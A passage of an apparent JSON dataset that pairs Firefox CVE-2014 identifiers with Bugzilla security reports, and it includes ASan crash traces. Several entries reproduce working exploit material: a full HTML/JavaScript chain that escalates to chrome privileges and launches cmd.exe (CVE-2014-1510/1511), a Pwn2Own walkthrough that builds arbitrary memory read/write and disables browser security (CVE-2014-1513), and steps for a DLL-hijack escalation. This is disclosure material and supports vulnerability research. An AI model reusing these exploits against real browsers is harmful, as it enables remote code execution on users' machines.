\"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsDisplayList.cpp\" #10 0x7fb967f2424a (libxul.so!nsDisplayList::PaintRoot(nsDisplayListBuilder*, nsRenderingContext*, unsigned int) const+0x24a) Line 1076 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsDisplayList.cpp\" #11 0x7fb967f75d95 (libxul.so!nsLayoutUtils::PaintFrame(nsRenderingContext*, nsIFrame*, nsRegion const&, unsigned int, unsigned int)+0x2205) Line 2339 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsLayoutUtils.cpp\" #12 0x7fb967dee741 (libxul.so!PresShell::Paint(nsView*, nsRegion const&, unsigned int)+0xe11) Line 5847 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsPresShell.cpp\" #13 0x7fb966d8e87c (libxul.so!nsViewManager::ProcessPendingUpdatesForView(nsView*, bool)+0x3fc) Line 420 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/view/src/nsViewManager.cpp\" #14 0x7fb967e121d0 (libxul.so!nsRefreshDriver::Tick(long, mozilla::TimeStamp)+0x2ba0) Line 1207 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #15 0x7fb967e16030 (libxul.so!mozilla::RefreshDriverTimer::Tick()+0x1f0) Line 168 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #16 0x7fb963af5d83 (libxul.so!nsTimerImpl::Fire()+0x6b3) Line 551 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #17 0x7fb963af64e6 (libxul.so!nsTimerEvent::Run()+0x66) Line 635 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #18 0x7fb963aedcf7 (libxul.so!nsThread::ProcessNextEvent(bool, bool*)+0xbd7) Line 637 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsThread.cpp\" #19 0x7fb9639c66d1 (libxul.so!NS_ProcessNextEvent(nsIThread*, bool)+0xb1) Line 263 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsThreadUtils.cpp\" #20 0x7fb9642e7a81 (libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*)+0x311) Line 95 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/MessagePump.cpp\" #21 0x7fb9642592f3 (libxul.so!MessageLoop::Run()+0x1c3) Line 226 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc\" #22 0x7fb966421a5c (libxul.so!nsBaseAppShell::Run()+0x5c) Line 161 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #23 0x7fb969111676 (libxul.so!nsAppStartup::Run()+0xc6) Line 276 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsAppStartup.cpp\" #24 0x7fb968f29ca5 (libxul.so!XREMain::XRE_mainRun()+0x1de5) Line 4023 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #25 0x7fb968f2abda (libxul.so!XREMain::XRE_main(int, char**, nsXREAppData const*)+0x4fa) Line 4091 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #26 0x7fb968f2bb0b (libxul.so!XRE_main+0x3ab) Line 4331 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #27 0x459dcd (firefox!main+0x94d) Line 280 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsBrowserApp.cpp\" #28 0x7fb97416676c (libc.so.6!__libc_start_main+0xec) Line 226 of \"libc-start.c\" #29 0x45934c (firefox!_start+0x28) Address 0x7fffa141ed10 is located in stack of thread T0 at offset 784 in frame #0 0x7fb9684f8a6f (libxul.so!nsDisplayNotation::Paint(nsDisplayListBuilder*, nsRenderingContext*)+0xf) Line 739 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/mathml/nsMathMLmencloseFrame.cpp\" This frame has 11 object(s): [32, 64) 'rect' [96, 112) '' [160, 176) '' [224, 288) '' [320, 336) '' [384, 400) '' [448, 464) '' [512, 528) '' [576, 592) '' [640, 656) '' [704, 784) 'p' HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext (longjmp and C++ exceptions *are* supported) Shadow bytes around the buggy address: 0x10007427bd50: f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 0x10007427bd60: 00 00 00 00 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 0x10007427bd70: 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 0x10007427bd80: 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 0x10007427bd90: 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 =>0x10007427bda0: 00 00[f4]f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00 0x10007427bdb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10007427bdc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x10007427bdd0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 0x10007427bde0: 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 0x10007427bdf0: 00 00 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==7859==ABORTING"
      }
    ],
    "CVE-2014-1510": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=982906",
        "title": "privilege content loading (ZDI-CAN-2214)",
        "description": "----- TL;DR ----- It is possible for untrusted web content to load a chrome-privileged page by getting JS-implemented WebIDL to call window.open(). A system-principal page loaded in an iframe can then be exploited to bypass the pop-up blocker by invoking document.open() from the unloaded window. This allows web content to open chrome://browser/content/browser.xul in a chrome window with the opener reference pointing to a content iframe. As a result, a user-controlled javascript URI can be loaded with the system principal, which allows arbitrary code execution. ----------------------------- 1. PRIVILEGED CONTENT LOADING ----------------------------- Chrome pages in Firefox load with the system security principal, which provides access to all browser functionalities, including launching of arbitrary local files with command line arguments. The browser is expected to prevent websites from loading privileged pages, otherwise a UXSS bug may lead to arbitrary code execution. When window.open() is called, its C++ implementation -- nsGlobalWindow::OpenInternal -- delegates the security check to nsGlobalWindow::SecurityCheckURL: >>>>>>>>> nsGlobalWindow.cpp >>>>>>>>> nsGlobalWindow::SecurityCheckURL(const char *aURL) { JSContext *cxUsed; bool freePass; nsCOMPtr<nsIURI> uri; if (NS_FAILED(BuildURIfromBase(aURL, getter_AddRefs(uri), &freePass, &cxUsed))) return NS_ERROR_FAILURE; AutoPushJSContext cx(cxUsed); if (!freePass && NS_FAILED(nsContentUtils::GetSecurityManager()-> CheckLoadURIFromScript(cx, uri))) return NS_ERROR_FAILURE; return NS_OK; } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< The noteworthy thing here is that the loaded URI isn't checked when the freePass flag is set to true. The reference to it is passed to nsGlobalWindow::BuildURIfromBase, which does the following: >>>>>>>>> nsGlobalWindow.cpp >>>>>>>>> nsGlobalWindow::BuildURIfromBase(const char *aURL, nsIURI **aBuiltURI, bool *aFreeSecurityPass, JSContext **aCXused) { nsIScriptContext *scx = GetContextInternal(); JSContext *cx = nullptr; *aBuiltURI = nullptr; *aFreeSecurityPass = false; if (aCXused) *aCXused = nullptr; // get JSContext NS_ASSERTION(scx, \"opening window missing its context\"); NS_ASSERTION(mDoc, \"opening window missing its document\"); if (!scx || !mDoc) return NS_ERROR_FAILURE; nsCOMPtr<nsIDOMChromeWindow> chrome_win = do_QueryObject(this); if (nsContentUtils::IsCallerChrome() && !chrome_win) { // If open() is called from chrome on a non-chrome window, we'll // use the context from the window on which open() is being called // to prevent giving chrome priveleges to new windows opened in // such a way. This also makes us get the appropriate base URI for // the below URI resolution code. cx = scx->GetNativeContext(); } else { // get the JSContext from the call stack cx = nsContentUtils::GetCurrentJSContext(); } (...) nsCOMPtr<nsPIDOMWindow> sourceWindow; if (cx) { nsIScriptContext *scriptcx = nsJSUtils::GetDynamicScriptContext(cx); if (scriptcx) sourceWindow = do_QueryInterface(scriptcx->GetGlobalObject()); } if (!sourceWindow) { sourceWindow = this; *aFreeSecurityPass = true; } (...) if (aCXused) *aCXused = cx; return NS_NewURI(aBuiltURI, nsDependentCString(aURL), charset.get(), baseURI); } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< The free pass is granted when it's impossible to determine the window associated with the script context of the call. In theory, this can happen in 2 cases: when there's no native script context (|cx|) on the stack, or it has no related dynamic script context (|scriptcx|). It's the latter case which is interesting. Whether or not a native script context (JSContext class) links to a dynamic script context depends on how the JSContext was created and is indicated by the |privateIsNSISupports| option in the related ContextOptions object. For instance, contexts created as part of docshell initialization (in the nsJSContext constructor) are always set up with a dynamic script context. This is not the case with contexts created in other places, for example via XPCJSContextStack::GetSafeJSContext(). If one of those ends up calling content-side window.open with the provided arguments, the URI security check can be bypassed. One way to achieve that is to use JS-implemented WebIDL. It's windowless -- instead, a BackstagePass object is used as a shim for the script global object. Whenever it's executed, the initial call setup pushes a JSContext from XPCJSContextStack::GetSafeJSContext(), because BackstagePass doesn't implement the nsIScriptGlobalObject interface necessary to derive a JSContext from it. The exploit uses WebRTC peer connection callbacks as a short and simple method of getting JS-implemented WebIDL to call a user-supplied function: (new mozRTCPeerConnection).createOffer(Map, open.bind(window, \"chrome://browser/content\", \"i\")); If createOffer is called on a connection without any attached MediaStreams, the error callback, passed in as the second argument, is later invoked from PeerConnection.js: >>>>>>>>>> PeerConnection.js >>>>>>>>>> _createOffer: function(onSuccess, onError, constraints) { this._onCreateOfferSuccess = onSuccess; this._onCreateOfferFailure = onError; <<< the bound window.open... this._getPC().createOffer(constraints); }, (...) onCreateOfferError: function(code, message) { this.callCB(this._dompc._onCreateOfferFailure, new RTCError(code, message)); this._dompc._executeNext(); }, (...) callCB: function(callback, arg) { if (callback) { try { callback(arg); <<< ... is invoked here } catch(e) { (...) <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< This causes nsGlobalWindow::OpenInternal to be called while the current JSContext has no dynamic script context. As a result, the free security pass is erroneously granted, and a system-principal page -- chrome://browser/content/browser.xul -- is opened in the iframe named \"i\". A SIDE NOTE: In theory, nsGlobalWindow::BuildURIfromBase could choose to use a different JSContext -- the one associated with the window open() is being called on: >>>>>>>>> nsGlobalWindow.cpp >>>>>>>>> if (nsContentUtils::IsCallerChrome() && !chrome_win) { cx = scx->GetNativeContext(); <<< derived from the window } else { cx = nsContentUtils::GetCurrentJSContext(); <<< the context of JS-implemented WebIDL } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< However, even though JS-implemented WebIDL code is chrome-privileged, nsContentUtils::IsCallerChrome() returns false. This is caused by the fact that during the call to mozRTCPeerConnection.createOffer, the reference to the bound window.open function is wrapped in a cross-compartment wrapper. As soon as the callback is called, the content compartment of the wrapped function is entered, causing subsequent nsContentUtils::IsCallerChrome() calls to return false."
      }
    ],
    "CVE-2014-1511": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=982909",
        "title": "popup blocker bypass (ZDI-CAN-2215)",
        "description": "------------------------ 2. POP-UP BLOCKER BYPASS ------------------------ Even after frame navigation, the unloaded window can still execute scripts, provided that the parent window holds a reference to a method such as |eval|. Obviously, it's limited in what it can do, for example all methods that forward operation from the inner window (Window per W3C) to the outer window (WindowProxy per W3C) will raise an exception: >>>>>>>>>> nsGlobalWindow.cpp >>>>>>>>>> #define FORWARD_TO_OUTER(method, args, err_rval) \\ PR_BEGIN_MACRO \\ if (IsInnerWindow()) { \\ nsGlobalWindow *outer = GetOuterWindowInternal(); \\ if (!HasActiveDocument()) { \\ NS_WARNING(outer ? \\ \"Inner window does not have active document.\" : \\ \"No outer window available!\"); \\ return err_rval; \\ } \\ return outer->method args; \\ } \\ <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< HasActiveDocument() checks for IsCurrentInnerWindow(), which returns false for unloaded inner windows. This prevents users from performing operations in the context of the outer window, now potentially hosting a document from another origin. This affects window.open() among other things. However, for this particular method, a workaround exists. When document.open() is called with 3 or more arguments, the call is forwarded to window.open(): >>>>>>>>>> nsHTMLDocument.cpp >>>>>>>>>> nsHTMLDocument::Open(JSContext* /* unused */, const nsAString& aURL, const nsAString& aName, const nsAString& aFeatures, bool aReplace, ErrorResult& rv) { NS_ASSERTION(nsContentUtils::CanCallerAccess(static_cast<nsIDOMHTMLDocument*>(this)), \"XOW should have caught this!\"); nsCOMPtr<nsIDOMWindow> window = GetWindow(); if (!window) { rv.Throw(NS_ERROR_DOM_INVALID_ACCESS_ERR); return nullptr; } nsCOMPtr<nsIDOMJSWindow> win = do_QueryInterface(window); nsCOMPtr<nsIDOMWindow> newWindow; // XXXbz We ignore aReplace for now. rv = win->OpenJS(aURL, aName, aFeatures, getter_AddRefs(newWindow)); return newWindow.forget(); } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Here, GetWindow() returns the outer window. Thus, OpenJS is called directly on the outer window, and FORWARD_TO_OUTER won't raise any error in nsGlobalWindow::OpenInternal. This bug can be leveraged to open a new pop-up window when the outer window's active document is chrome-privileged: >>>>>>>>>> nsGlobalWindow.cpp >>>>>>>>>> bool nsGlobalWindow::PopupWhitelisted() { if (!IsPopupBlocked(mDoc)) <<< mDoc is the XUL document currently loaded in the frame return true; (...) } (...) bool IsPopupBlocked(nsIDocument* aDoc) { nsCOMPtr<nsIPopupWindowManager> pm = do_GetService(NS_POPUPWINDOWMANAGER_CONTRACTID); (...) uint32_t permission = nsIPopupWindowManager::ALLOW_POPUP; pm->TestPermission(aDoc->NodePrincipal(), &permission); <<< permission is tested against the system principal... return permission == nsIPopupWindowManager::DENY_POPUP; <<< ... which allows pop-ups, so this returns false } <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< When a \"chrome:\" URI is opened in a new window and the \"chrome\" option is specified as the third argument to document.open(), the URI is opened in a type=chrome window. Chrome windows provide 2 important benefits: A) They define messageManager, which several chrome pages, such as browser.xul, require to function properly. Due to the missing messageManager, the browser.xul instance which was opened in the content frame threw a script error early on. B) javascript: URIs opened from such docshells can inherit the system principal. The feature A) allows browser.js (a script file included from browser.xul) to execute code responsible for reopening the sidebar from the opener window. Since the chrome window hosting browser.xul is being opened from an iframe in the content land, the values browser.js will read from the opener, including the URI of the sidebar, are user-controlled. The exploit replaces the contents of the opener iframe immediately after the call to document.open(): var s = \"document.open('chrome://browser/content','','chrome'); location = u\"; Where \"u\" is the URI of the data: document containing the \"sidebar\" element: <img id=\"sidebar\" src=\"javascript:code()\"> -- and a few others to ensure that browser.js doesn't throw when it tries to read them via the opener reference. The feature B) mentioned above ensures that |javascript:code()| reopened in the chrome window's sidebar inherits the system-principal from the enclosing browser.xul document. As soon as this happens, the browser is compromised. ------- EXPLOIT ------- Here's the exploit code with some additional notes: <!DOCTYPE html> <iframe name=\"i\" style=\"display:none\"></iframe> <<< 1 <script> i.u = \"data:text/html,\" + String(function(){/*# <<< 2 <form id=\"sidebar-box\" sidebarcommand=\"frame\"><img name=\"boxObject\"></form> <<< 3 <img id=\"sidebar-title\"> <<< 4 <img id=\"sidebar\"> <<< 5 <script> var s = document.getElementById(\"sidebar\"); s.src = \"javascript:C=Components;c=C.classes;i=C.interfaces;\" + \"f=c['@mozilla.org/file/local;1'].createInstance(i.nsILocalFile);\" + \"p=c['@mozilla.org/process/util;1'].createInstance(i.nsIProcess);\" + \"f.initWithPath('C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\cmd.exe');\" + \"p.init(f);p.run(0,['/kcalc.exe'],1);top.close()\";</# */}).match(/#([\\s\\S]+)#/)[1] + \"script>\"; var s = \"document.open('chrome://browser/content','','chrome'); location = u\"; <<< 6 var e = i.eval.bind(0,s); var c = new mozRTCPeerConnection; c.createOffer(Map,open.bind(top,\"chrome://browser/content\",\"i\")); <<< 7 setTimeout(\"c.createOffer(Map,e)\",1000); <<< 8 </script> 1. This is the iframe a chrome-privileged page will be loaded in. No source is specified, so it initially loads a same-origin about:blank document. It'll be used to call open() on the outer window after the frame has navigated to the chrome page. 2. The variable |u| stores the URI of the document which the chrome window will see as the opener. Below are its elements. 3. This is to satisfy the following opener references in browser.js, function gBrowserInit.onLoad(): >>>>>> let openerSidebarBox = window.opener.document.getElementById(\"sidebar-box\"); (...) let sidebarCmd = openerSidebarBox.getAttribute(\"sidebarcommand\"); let sidebarCmdElem = document.getElementById(sidebarCmd); (...) sidebarBox.setAttribute(\"width\", openerSidebarBox.boxObject.width); <<<<<< |sidebarCmd| must be a valid element id from the browser.xul document, \"frame\" is the shortest one. 4. This is to satisfy the following opener reference in browser.js, function gBrowserInit.onLoad(): >>>>>> sidebarTitle.setAttribute( \"value\", window.opener.document.getElementById(\"sidebar-title\").getAttribute(\"value\")); <<<<<< 5. This is the element whose \"src\" attribute contains the URI to be opened in the privileged context: >>>>>> sidebarBox.setAttribute( \"src\", window.opener.document.getElementById(\"sidebar\").getAttribute(\"src\")); <<<<<< 6. Code that will be executed in the about:blank context after the frame has navigated to a chrome page. It's OK if |location| is assigned after the call to document.open, because it takes longer to open the chrome window than to load the data: URI in the frame. 7. The actual action starts here. The first bug is exploited to open a privileged page in the frame. 8. Since #7 happens asynchronously, the next step must be delayed. The chrome page must be loaded before the pop-up blocker bypass with document.open is attempted, but there's one more reason to wait, related to how garbage collection works in Firefox. Shortly after the about:blank document is navigated away, all chrome-to-content object wrappers are nuked and replaced with a DeadObjectProxy, which throws on every access. If GC occured after the bound eval had been wrapped in the call to createOffer, but before the error callback is invoked, the exploit would fail. A 1000ms timeout provides plenty of time for both navigation and GC. Also, note that the free security pass bug must be reused because document.open would fail to open a privileged page without it -- even if open is called on the outer window with a privileged document, the chrome compartment is never entered, so a separate bypass is needed to ensure that the chrome URI is accepted."
      }
    ],
    "CVE-2014-1512": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=982957",
        "title": "OOM in TypeObject::sweep leaves pointers dangling (VUPEN Pwn2Own) (ZDI-CAN-2219)",
        "description": "No description provided."
      }
    ],
    "CVE-2014-1513": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=982974",
        "title": "TypedArrayObject.cpp doesn't take into account that ArrayBuffers can be neutered (ZDI-CAN-2220)",
        "description": "Pwn2Own 2014 Firefox exploit By Jüri Aedla The bug Code in js/src/vm/TypedArrayObject.cpp doesn't take into account that ArrayBuffers can be neutered. Neutering sets ArrayBuffer length to zero. Quite a few functions are probably vulnerable, I tested TypedArrayObjectTemplate::fun_subarray_impl() and DataViewObject::write(). fun_subarray_impl() does: … uint32_t length = tarray->length(); … if (!ToClampedIndex(cx, args[1], length, &end)) … JSObject *nobj = createSubarray(cx, tarray, begin, end); It stores the array length and then reads the value of args[1]. If args[1] is an object, its valueOf() is called, so attacker gets control. Attacker can then neuter the array so its length becomes zero. Now fun_subarray_impl() proceeds with an invalid length and creates a large subarray of an empty array. The subarray is returned to the attacker, so he gets an OOB chunk which he can read/write. The OOB chunk lies in javascript heap. Normally large ArrayBuffer contents are allocated externally. But as the ArrayBuffer is neutered, ArrayBufferObject::changeContents() resets the elements pointer to fixedElements(), which points into the ArrayBuffer object itself, allocated in JS heap. So the attacker can now read/write an OOB chunk in JS heap. Exploit The exploit consists of two components. Code under neuter/ achieves arbitrary read/write and leaks a pointer to data section. It is wrapped in a RW module, which has functions ReadU8(), WriteU8() and LeakPtr(). Second part of the code under libexp/ takes the RW module and executes calc. It is reusable. Arbitrary read/write The exploit escalates the read/write of JS heap chunk into arbitrary read/write by taking control over a Uint8Array. Uint8Array is a nice target because one of its slots is pointer to data. By overwriting this pointer we can read/write arbitrary locations. So the expoit creates a neuterable ArrayBuffer: this.unused.push(this.audio_context.createBuffer(1, conf.oob_size_u32, 96000)); … this.audio_buffer = this.unused.pop() Then it creates 500000 Uint8Arrays: for (var i = 0; i < conf.num_views; i++) this.views.push(new Uint8Array(this.buffer_for_views, conf.magic_offset, conf.magic_length)); The magic_offset is 20 random bits which make it easy to search for the views from the OOB block. Now we create a subarray of an Uint32Array which wraps a neuterable ArrayBuffer: var view_f32 = this.audio_buffer.getChannelData(0); var array_buffer = view_f32.buffer; var view_u32_tmp = new Uint32Array(array_buffer); this.oob = view_u32_tmp.subarray(0, end); The end is an object whose valueOf() neuters the ArrayBuffer: var convolver = this.audio_context.createConvolver(); convolver.buffer = this.audio_buffer; So OOB memory block can now be accessed via this.oob. Let's search for any Uint8Array: for (var i = 0; i < this.oob.length; i++) { if (this.oob[i + this.ByteOffsetSlot] == this.conf.magic_offset && this.oob[i + this.ByteLengthSlot] == this.conf.magic_length) { break; Then determine which one we found: this.oob[this.SlotOffset(this.ByteOffsetSlot)]--; for (var i = 0; i < this.views.length; i++) { if (this.views[i].byteOffset == this.conf.magic_offset - 1) { break; We can now overwrite the data pointer of found Uint8Array. Let's implement ReadU8(): this.SetAddress(address); return this.rw_view[0]; SetAddress() overwrites the data pointer: this.WritePointerSlot(this.DataSlot, address); which does: var offset = this.SlotOffset(slot); this.oob[offset] = pointer.Low(); if (platform.Is64BitBrowser()) this.oob[offset + 1] = pointer.High(); WriteU8() is similar. Now to break ASLR. We basically read Uint8Array->type_->clasp, which points into static TypedArrayObject::classes[]. The classes array lies in the data section of mozjs.dll, so we find where mozjs.dll is: var type_address = this.ReadPointerSlot(this.TypeSlot); var type = new Variable(this, type_address, this.type_object_type); this.leaked_ptr = type.clasp.Read(); The RW module is now complete. Btw, the Variable above is a helper object that can read/write different integer types, pointers, struct fields. The first argument to Variable is the RW module, second is the variable address, third is variable type. The type_object_type is defined as: this.type_object_type = { kind: 'struct', fields: { clasp: {offset: 0, type: Variable.Pointer}, }, } So we're declaring a struct with clasp pointer field at offset 0. Getting Components Now to escalate arbitrary read/write into privileged javascript. For that the exploit creates the \"security.turn_off_all_security_so_that_viruses_can_take_over_this_co mputer\" pref entry. Once we have this entry, new iframes will have netscape.security.PrivilegeManager attached. Once we have that, we can get the Components object: netscape.security.PrivilegeManager.enablePrivilege(); This gives us the privileged Components object, which enables us to access the filesystem and launch processes. Here's the code creates the pref entry: var key = 'security.turn_off_all_security_so_that_viruses_can_take_over_this_computer'; var hash = 0x3da5e8d3; var key_string = this.memory.AllocateString(key).address; var hash_table = this.memory.GetVariable('xul!gHashTable', this.hash_table_type); var hash_shift = hash_table.hash_shift.ReadJsNum(); var entry_index = U32Shr(hash, hash_shift); var entry = hash_table.entry_store.DerefAt(entry_index); entry.key_hash.WriteJsNum(hash); entry.key.Write(key_string); entry.user_pref.WriteJsNum(1); entry.flags.WriteJsNum(0x0082); return entry; So we calculate the entry_index and fill out key_hash, key, user_pref and flags of the entry. Executing calc Once we have the privileged Components, we execute calc: var file = this.CreateClass('file/local', 'nsIFile'); var stream = this.CreateClass('network/file-output-stream', 'nsIFileOutputStream'); var process = this.CreateClass('process/util', 'nsIProcess'); var command = this.GetCommand(); file.initWithPath(this.GetShellScriptPath()); stream.init(file, this.Wronly | this.CreateFile | this.Truncate, 0755, 0); stream.write(command, command.length); stream.close(); process.init(file); process.run(true, [], 0); file.remove(false); where command == 'start calc' and GetShellScriptPath() creates a temporary path for a .bat file. So we create a .bat file, write 'start calc' inside and launch it."
      }
    ],
    "CVE-2014-1514": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=983344",
        "title": "ZDI-CAN-2225 vmtypedarrayobject.cpp dst ptr is checked the length is not checked",
        "description": "No description provided."
      }
    ],
    "CVE-2014-1515": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=945429",
        "title": "Do not handle file: paths by downloading them",
        "description": "This is a key aspect of the attack in Bug 944373: a page is loaded which includes an iframe with a src attribute pointing to a file in the profile directory. Firefox responds by downloading the (potentially sensitive) file to the SD card, which is world-readable."
      }
    ],
    "CVE-2014-1517": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=713926",
        "title": "[SECURITY] Login form lacks CSRF protection",
        "description": "[spinning off from bug 471801] The (CGI-based) login form lacks any type of CSRF protection. This is needed to alleviate the concern specified in section 3 of Adam Barth's CSRF paper (http://seclab.stanford.edu/websec/csrf/csrf.pdf) where an attacker could cause a user to authenticate to Bugzilla using the *attacker's* credentials. While not optimal, this restricts login form uses to the user's IP plus the time period of MAX_TOKEN_AGE."
      }
    ],
    "CVE-2014-1520": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=961676",
        "title": "Unsafe temp directory usage in maintenservice_installer.exe lead to possible privilege escalation",
        "description": "I have seen the following behavior with windows 7 32bit and the maintenservice_installer.exe which is for example executed during an update process with the mozilla maintenance service. The installer creates during execution a file with the following name format and executes the file: C:\\Windows\\Temp\\ns{random character a-z generated with GetTickCount%26}{16bit hex value from GetTickCount()}.tmp\\ns{16bit hex value from GetTickCount()}.tmp For example: C:\\Windows\\Temp\\nscFF1B.tmp\\nsFFCA.tmp It is possible to force the executable to load dlls from the current directory with an „executable.local” dirctory in the directory of the executable (windows specific feature). For the example with a ”C:\\Windows\\Temp\\nsFF1B.tmp\\nsFFCA.tmp.local” directory, the dlls loaded from the nsFFCA.tmp executable will be first searched in the nsFFCA.tmp.local directory, then in the nscFF1B.tmp directory and at least at the system path. Because the temp directory is writable for normal users and the path is easy to guess because of the use of GetTickCount() there is a privilege escalation vulnerability. POC: To try out the poc you need firefox 26.0 with the maintenance service installed and a 32bit windows. I used windows 7. My poc tries to force the executable to load a fake mcrvrt.dll from the directory to start a calc.exe with system rights. Because of GetTickCount() this attack is timing dependent. Steps: 1.) download poc and extract the files 2.) copy the updater.exe from the firefox directory to the poc/update directory 3.) download http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/26.0/update/win32/en-US/firefox-26.0.complete.mar and save the file as update.mar in the poc/update directory 4.) alter the paths in update.bat to your paths 5.) start poc.exe 6.) start update.bat 7.) wait for output from poc.exe 8.) check for calc.exe 9.) if no calc.exe found, start update again With windows 7 64bit no executable is loaded in the temp directory, so this will not work but maybe there is another way. Maybe the source of this vulnerability is in the nullsoft installer system and not in the script to create the installer, so maybe it's a general nsis problem."
      }
    ],
    "CVE-2014-1522": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995289",
        "title": "Out-of-Bounds Read in mozilla::dom::OscillatorNodeEngine::ComputeCustom",
        "description": "The poc crashes also firefox 28.0. The asan report was generated with this build: http://ftp.mozilla.org/pub/mozilla.org/firefox/nightly/2014/04/2014-04-11-03-02-01-mozilla-central/firefox-31.0a1.en-US.linux-x86_64-asan.tar.bz2"
      }
    ],
    "CVE-2014-1523": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=969226",
        "title": "Heap-buffer-overflow in read_u32",
        "description": "To reproduce, visit http://www.forumsfamilie.de/index.php ==7222==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200036d473 at pc 0x7fd89ea02b83 bp 0x7fd84df71950 sp 0x7fd84df71948 READ of size 4 at 0x60200036d473 thread T63 (ImageDecoder #2) #0 0x7fd89ea02b82 in read_u32 gfx/qcms/iccread.c:100 #1 0x7fd89e9fe76a in qcms_profile_from_memory gfx/qcms/iccread.c:1023 #2 0x7fd889bf8d4f in mozilla::image::GetICCProfile(jpeg_decompress_struct&) image/decoders/nsJPEGDecoder.cpp:68 #3 0x7fd889bf4d44 in mozilla::image::nsJPEGDecoder::WriteInternal(char const*, unsigned int, mozilla::image::DecodeStrategy) image/decoders/nsJPEGDecoder.cpp:258 #4 0x7fd889b0ab64 in mozilla::image::Decoder::Write(char const*, unsigned int, mozilla::image::DecodeStrategy) image/src/Decoder.cpp:107 #5 0x7fd889ab904b in mozilla::image::RasterImage::WriteToDecoder(char const*, unsigned int, mozilla::image::DecodeStrategy) image/src/RasterImage.cpp:2148 #6 0x7fd889acb74a in mozilla::image::RasterImage::DecodeSomeData(unsigned int, mozilla::image::DecodeStrategy) image/src/RasterImage.cpp:2779 #7 0x7fd889adadb9 in mozilla::image::RasterImage::DecodePool::DecodeSomeOfImage(mozilla::image::RasterImage*, mozilla::image::DecodeStrategy, mozilla::image::RasterImage::DecodePool::DecodeType, unsigned int) image/src/RasterImage.cpp:3419 #8 0x7fd889adc477 in mozilla::image::RasterImage::DecodePool::DecodeJob::Run() image/src/RasterImage.cpp:3285 #9 0x7fd883c91475 in nsThreadPool::Run() xpcom/threads/nsThreadPool.cpp:208 #10 0x7fd883c91fd4 in non-virtual thunk to nsThreadPool::Run() objdir-ff-asan-sym/xpcom/threads/Unified_cpp_xpcom_threads0.cpp:222 #11 0x7fd883c7d718 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:643 #12 0x7fd88368f442 in NS_ProcessNextEvent(nsIThread*, bool) xpcom/glue/nsThreadUtils.cpp:263 #13 0x7fd885ebeb0d in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:303 #14 0x7fd885b823b7 in 